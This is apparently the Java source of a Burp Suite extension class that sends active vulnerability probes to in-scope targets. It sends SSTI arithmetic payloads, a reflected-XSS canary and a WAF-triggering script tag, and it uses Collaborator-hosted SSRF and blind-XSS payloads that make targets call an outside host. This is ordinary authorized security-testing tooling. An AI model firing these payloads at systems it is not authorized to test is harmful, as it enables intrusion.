package com.victor.reconloop;

import burp.api.montoya.MontoyaApi;
import burp.api.montoya.collaborator.CollaboratorClient;
import burp.api.montoya.collaborator.CollaboratorPayload;
import burp.api.montoya.http.message.HttpRequestResponse;
import burp.api.montoya.http.message.params.HttpParameter;
import burp.api.montoya.http.message.requests.HttpRequest;
import burp.api.montoya.http.message.responses.HttpResponse;

import java.util.*;

/**
 * Opt-in active vulnerability probing: SSRF and blind XSS via Burp Collaborator OOB interactions,
 * server-side template injection via arithmetic evaluation, reflected-XSS confirmation via a
 * metacharacter canary, and lightweight WAF fingerprinting.
 *
 * <p>Every request is scope-checked and throttled by the caller. Payload firing only happens when
 * the user has explicitly enabled active tests. Detection cores ({@link #detectSstiEval},
 * {@link #survivingXssChars}, {@link #fingerprintWaf}, {@link #encodeCorrelation}) are pure and
 * unit-tested; the Montoya-facing orchestration is deliberately thin.
 */
final class ActiveTestEngine {

    record ActiveFinding(String severity, String testClass, String parameter,
                         String evidence, boolean confirmed, String url) {}

    // Server-side template injection: distinctive product avoids coincidental "49" matches.
    static final long SSTI_A = 7, SSTI_B = 777, SSTI_PRODUCT = SSTI_A * SSTI_B; // 5439
    static final String SSTI_PREFIX = "rhs", SSTI_SUFFIX = "she";
    static final String SSTI_HIT = SSTI_PREFIX + SSTI_PRODUCT + SSTI_SUFFIX;

    private static final List<String> SSTI_PAYLOADS = List.of(
            SSTI_PREFIX + "{{7*777}}" + SSTI_SUFFIX,     // Jinja2 / Twig
            SSTI_PREFIX + "${7*777}" + SSTI_SUFFIX,      // JSP EL / Freemarker / Thymeleaf
            SSTI_PREFIX + "#{7*777}" + SSTI_SUFFIX,      // Ruby / JSF / Spring
            SSTI_PREFIX + "<%=7*777%>" + SSTI_SUFFIX,    // ERB / EJS
            SSTI_PREFIX + "${{7*777}}" + SSTI_SUFFIX,    // nested
            SSTI_PREFIX + "{7*777}" + SSTI_SUFFIX);      // simple brace

    private static final String XSS_TOKEN = "rhx";
    private static final String XSS_PROBE = "<img>\"'";
    private static final String WAF_PROBE = "<script>alert(1)</script>";

    private final MontoyaApi api;
    private final long throttleMillis;
    private volatile CollaboratorClient collaborator;

    ActiveTestEngine(MontoyaApi api, long throttleMillis) {
        this.api = api;
        this.throttleMillis = throttleMillis;
    }

    void setCollaborator(CollaboratorClient collaborator) { this.collaborator = collaborator; }

    /** Runs the enabled active probes against every non-cookie parameter of {@code base}. */
    List<ActiveFinding> test(HttpRequest base, int maxRequests) {
        if (base == null) return List.of();
        List<ActiveFinding> findings = new ArrayList<>();
        int budget = maxRequests;

        List<HttpParameter> parameters;
        try {
            parameters = new ArrayList<>(base.parameters());
        } catch (Exception e) {
            return List.of();
        }

        boolean wafChecked = false;
        for (HttpParameter parameter : parameters) {
            if (parameter == null || parameter.name() == null || parameter.name().isBlank()) continue;
            if ("COOKIE".equalsIgnoreCase(String.valueOf(parameter.type()))) continue;
            if (budget <= 0) break;

            if (!wafChecked) {
                budget -= testWaf(base, parameter, findings);
                wafChecked = true;
            }
            if (budget > 0) budget -= testReflectedXss(base, parameter, findings);
            if (budget > 0) budget -= testSsti(base, parameter, findings);
            if (budget > 0) budget -= testSsrf(base, parameter, findings);
            if (budget > 0) budget -= testBlindXss(base, parameter, findings);
        }
        return findings;
    }

    private int testWaf(HttpRequest base, HttpParameter parameter, List<ActiveFinding> out) {
        HttpResponse response = sendMutated(base, parameter, WAF_PROBE);
        if (response == null) return 1;
        Optional<String> waf = fingerprintWaf(response.statusCode(),
                response.bodyToString(), response.headerValue("Server"));
        waf.ifPresent(vendor -> out.add(new ActiveFinding("INFO", "WAF", parameter.name(),
                "Likely WAF/filter: " + vendor + " (status " + response.statusCode() + ")", true, base.url())));
        return 1;
    }

    private int testReflectedXss(HttpRequest base, HttpParameter parameter, List<ActiveFinding> out) {
        String token = XSS_TOKEN + Integer.toString(parameter.name().hashCode() & 0xffff, 36);
        HttpResponse response = sendMutated(base, parameter, token + XSS_PROBE);
        if (response == null) return 1;
        String surviving = survivingXssChars(response.bodyToString(), token);
        if (!surviving.isEmpty()) {
            String severity = (surviving.contains("<") && surviving.contains(">")) ? "HIGH" : "MEDIUM";
            out.add(new ActiveFinding(severity, "XSS", parameter.name(),
                    "Reflected metacharacters survived unencoded: " + surviving, true, base.url()));
        }
        return 1;
    }

    private int testSsti(HttpRequest base, HttpParameter parameter, List<ActiveFinding> out) {
        int sent = 0;
        for (String payload : SSTI_PAYLOADS) {
            HttpResponse response = sendMutated(base, parameter, payload);
            sent++;
            if (response == null) continue;
            Optional<String> engine = detectSstiEval(response.bodyToString(), payload);
            if (engine.isPresent()) {
                out.add(new ActiveFinding("HIGH", "SSTI", parameter.name(),
                        "Template arithmetic evaluated (" + SSTI_A + "*" + SSTI_B + "=" + SSTI_PRODUCT
                                + ") via " + engine.get(), true, base.url()));
                break;
            }
        }
        return sent;
    }

    private int testSsrf(HttpRequest base, HttpParameter parameter, List<ActiveFinding> out) {
        CollaboratorClient client = collaborator;
        if (client == null) return 0;
        String correlation = encodeCorrelation("SSRF", parameter.name(), base.url());
        CollaboratorPayload payload = client.generatePayload(correlation);
        HttpResponse response = sendMutated(base, parameter, "http://" + payload + "/");
        if (response != null && response.bodyToString().contains(payload.toString())) {
            out.add(new ActiveFinding("HIGH", "SSRF", parameter.name(),
                    "Collaborator host reflected in response (probable full-response SSRF)", true, base.url()));
        } else {
            out.add(new ActiveFinding("INFO", "SSRF", parameter.name(),
                    "Collaborator SSRF payload sent; awaiting OOB interaction", false, base.url()));
        }
        return 1;
    }

    private int testBlindXss(HttpRequest base, HttpParameter parameter, List<ActiveFinding> out) {
        CollaboratorClient client = collaborator;
        if (client == null) return 0;
        String correlation = encodeCorrelation("XSS-blind", parameter.name(), base.url());
        CollaboratorPayload payload = client.generatePayload(correlation);
        sendMutated(base, parameter, "\"><script src=//" + payload + "></script>");
        out.add(new ActiveFinding("INFO", "XSS-blind", parameter.name(),
                "Blind-XSS beacon sent; awaiting OOB interaction", false, base.url()));
        return 1;
    }

    private HttpResponse sendMutated(HttpRequest base, HttpParameter parameter, String value) {
        try {
            if (!api.scope().isInScope(base.url())) return null;
            HttpParameter mutated = HttpParameter.parameter(parameter.name(), value, parameter.type());
            HttpRequestResponse rr = api.http().sendRequest(base.withUpdatedParameters(mutated));
            throttle();
            return rr == null ? null : rr.response();
        } catch (Exception e) {
            api.logging().logToError("Active probe failed for " + parameter.name(), e);
            return null;
        }
    }

    private void throttle() {
        if (throttleMillis <= 0) return;
        try { Thread.sleep(throttleMillis); } catch (InterruptedException e) { Thread.currentThread().interrupt(); }
    }

    // ---- pure detection cores (unit-tested) ----

    /** Returns the template engine family if the arithmetic marker evaluated, else empty. */
    static Optional<String> detectSstiEval(String body, String payload) {
        if (body == null || !body.contains(SSTI_HIT)) return Optional.empty();
        String family;
        if (payload.contains("{{")) family = "Jinja2/Twig-style {{...}}";
        else if (payload.contains("${{")) family = "nested ${{...}}";
        else if (payload.contains("${")) family = "EL/Freemarker ${...}";
        else if (payload.contains("#{")) family = "Ruby/JSF #{...}";
        else if (payload.contains("<%=")) family = "ERB/EJS <%=...%>";
        else family = "brace {...}";
        return Optional.of(family);
    }

    /** Of {@code < > " '}, which appear literally in the body immediately after {@code token}. */
    static String survivingXssChars(String body, String token) {
        if (body == null || token == null) return "";
        int index = body.indexOf(token);
        if (index < 0) return "";
        int end = Math.min(body.length(), index + token.length() + 16);
        String tail = body.substring(index + token.length(), end);
        StringBuilder surviving = new StringBuilder();
        for (char c : new char[]{'<', '>', '"', '\''}) {
            if (tail.indexOf(c) >= 0) surviving.append(c);
        }
        return surviving.toString();
    }

    /** Best-effort WAF/filter vendor identification from a blocked response. */
    static Optional<String> fingerprintWaf(int status, String body, String server) {
        String haystack = ((server == null ? "" : server) + "\n" + (body == null ? "" : body))
                .toLowerCase(Locale.ROOT);
        String[][] signatures = {
                {"cloudflare", "Cloudflare"},
                {"cf-ray", "Cloudflare"},
                {"attention required", "Cloudflare"},
                {"akamai", "Akamai"},
                {"incapsula", "Imperva Incapsula"},
                {"imperva", "Imperva"},
                {"mod_security", "ModSecurity"},
                {"modsecurity", "ModSecurity"},
                {"the requested url was rejected", "F5 BIG-IP ASM"},
                {"big-ip", "F5 BIG-IP"},
                {"sucuri", "Sucuri"},
                {"barracuda", "Barracuda"},
                {"aws", "AWS WAF"},
                {"x-amzn-waf", "AWS WAF"},
                {"wordfence", "Wordfence"},
        };
        for (String[] signature : signatures) {
            if (haystack.contains(signature[0])) return Optional.of(signature[1]);
        }
        if (status == 406 || status == 501 || status == 999
                || (status == 403 && haystack.contains("access denied"))) {
            return Optional.of("generic (blocked with status " + status + ")");
        }
        return Optional.empty();
    }

    static String encodeCorrelation(String testClass, String parameter, String url) {
        return "AC|" + testClass + "|" + parameter + "|" + (url == null ? "" : url.replace("|", "%7C"));
    }

    static String[] decodeCorrelation(String customData) {
        if (customData == null || !customData.startsWith("AC|")) return null;
        String[] parts = customData.split("\\|", 4);
        if (parts.length != 4) return null;
        return new String[]{parts[1], parts[2], parts[3].replace("%7C", "|")};
    }
}
